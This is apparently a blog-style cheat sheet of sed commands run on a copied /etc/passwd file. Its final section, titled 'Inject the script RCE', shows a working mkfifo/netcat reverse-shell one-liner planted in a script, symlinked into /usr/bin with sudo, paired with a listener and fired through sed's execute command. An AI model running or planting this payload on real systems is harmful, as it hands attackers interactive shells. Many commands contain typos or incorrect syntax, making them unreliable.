# SED Command cheat sheet in linux | mkfifo
SED command in UNIX stands for stream editor and it can perform lots of functions on files like searching, find and replace, insertion or deletion. Though most common use of SED command in UNIX is for substitution or for find and replace.

#### Situations you can use SED
Chane word or line in a file
Hole document editor
Change file according to another file
Direct input
No editor required to edit files
Comment or uncomment a line in bash
#### Demo shows how to comment a line using sed.

#### Syntax
sed options 'script' input file
```
cat file|sed 'script'
```

####  Copy passwd file in the home
```
cp /etc/passwd .
```

####  Print the file
```
 sed 'p' passed
```

####  Print new lines first
```
 sed -n 'p' passed
```

####  Print first line only
```
 sed '1p' passed
```

####  Print multiple lines
```
sed -n 'p1;p2' passed
```

####  Print multiple lines
```
sed -n 'p1;p2;10,20' passed
```

####  Seriese of lines
```
sed -n '1,10p' passed
```

####  Print multiple lines, series of lines 
```
cat -n passwd |sed -n '1p;2p;3p;6,10p'
```

####  Find the words or match
```
cat passwd|sed -n "/bash/p"
```

####  Find the multiple words or match (use separator to separate)
```
cat passwd|sed -n "/bash/p;/root/p"
```

####  if a match is in the first line ( ^ carrot symbol) print it
```
cat passwd | sed -n "/$root/p"
```

####  Print if it has multiple lines of characters in the start [abcdf]
```
cat passwd | sed -n "/^[abcd]/p"
```

####  Print if the line starts with a series of characters [a-e]
```
cat passwd | sed -n "/^[a-e]/p"
cat passwd | sed -n "/^[a-e]/p"
```

####  Print lines starts with root +3 lines after that
```
cat passwd| sed -n "/root/, +3p" (print 3 more after match)
```
or
```
cat passwd| sed -n "/^root/,3p" (print 3 lines from match)
```

####  Create a file with random words with upper lower and special characters
```
"hello
google			new
Hello
HELLO
$%^^&
google@gmail.com

endOF$$$$the^&LIne
1234566"
```

####  Print upper case lines only
```
cat temp|sed -n '/[[:upper:]]/p' 
```

####  Print Lower case lines
```
cat temp|sed -n '/[[:lower:]]/p'
```

####  Print special characters only 
```
cat temp|sed -n '/[[:punct:]]/p'
```

####  Print lines or words that have space in it
```
cat temp|sed -n '/[[:space:]]/p'
```

####  Print lines or words which has digits in it
```
cat temp|sed -n '/[[:digit:]]/p'
```

####  Print hidden characters line enter, tab 
```
cat temp|sed -n 'l'
```

####  Run command before the match
```
cat passwd| sed '/root/ e clear'
```

####  Run command print text before the match
```
cat passwd| sed '/root/ e echo "This is new line"'
```

####  Run command before all the line
```
cat passwd| sed 'e pwd'
```

####  Run command before first line only
```
cat passwd| sed '1 e pwd'
```


####  Save output into another file
```
cat passwd|sed -n '1p' >xyz.txt
```

####  Save output append another file
```
cat passwd|sed -n '1p' >>xyz.txt
```

####  Find a match (root) and write it into a new file named file.txt
```
cat passwd| sed -n "/root/ w file.txt"
```

####  replace the output of paswd with temp (replace all the lines of passwd file with temp files content (file.txt or temp.txt will be an invalid file, do not use extenssion)
```
sed -n 'r temp' passed
```

####  Print all the line numbers of the file
```
cat passwd|sed -n '='
```

####  remove fist match using option s (scirpt), replace root with blood (s stands for script)
```
cat passwd | sed 's/root/blood/'
```

####  replace all the matches using option sg (script, global), replace root with blood (g stands for global)
```
cat passwd | sed 's/root/blood/g'
```


####  replace all the matches according to the line number (we will use 1 s)
```
cat passwd | sed '1 s/root/blood/g'
```

####  Try to replace Root, (Root doesn't exist) 
```
cat passwd | sed '1s/Root/blood/g' (no change will visible)
```

####  replace all the Root (it is case sensitive, we need to ignore the case-sensitive Root and delete the replace root) (we will use ig)
```
cat passwd| sed '1 s/Root/blood/ig'
```

####  Replace all the root word, with blood between a range of lines 
```
cat passwd| sed '1,10 s/Root/blood/ig'
```

####  Replace 2nd match only
```
cat passwd| sed 's/root/blood/2'
```

####  Replace content in the file using option -i 
```
sed -i 's/root/blood/g' passed
```

####  Replace the content in the password file but create a backup file too
```
sed -i.backup 's/root/blood/g' passed
```

####  command lines, (add # in the first lines)
```
cat passwd|sed '1 s/^/#/'
```

####  comment the range of the lines 1-10
```
cat passwd|sed '1,10 s/^/#/'
```

####  Uncomment means remove # from the range or line number
```
cat passwd|sed '1,10 s/^#//'
```

####  Delete line number or range
```
cat -n passwd|sed '1d'
cat -n passwd|sed '1,10d'
cat -n passwd|sed '1d;2d;3d'
```

####  delete empty line whereas ^ will be start and $ will be end
```
cat passwd|sed -i '/^$/d'
```

####  Inject the script RCE in to command
- Create a tool demo
nano demo
```
exps(){
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f &
# What is mkfifo
# First In, First Out
#
In a Linux directory listing, the letter p in the file permissions indicates that the file is a named pipe,
# which is created using the mkfifo command.
# Named pipes are also referred to as FIFOs (First In, First Out) and are a form of interprocess communication.
# or
# mkfifo is a command in Linux used to create a special type of file called a FIFO (First In, First Out).
# A FIFO is also known as a named pipe, and it provides a mechanism for interprocess communication (IPC) between two processes.
}
exps
```

- Provide the permission and add the soft link
```
chmod +x demo
sudo ln -s $PWD/demo /usr/bin
```

- Listen on another terminal
  ```
  nc -nlvp 4444
  ```

  - Start the script command demo
  ```
  asswd| sed '/root/ e demo'
  ``` 

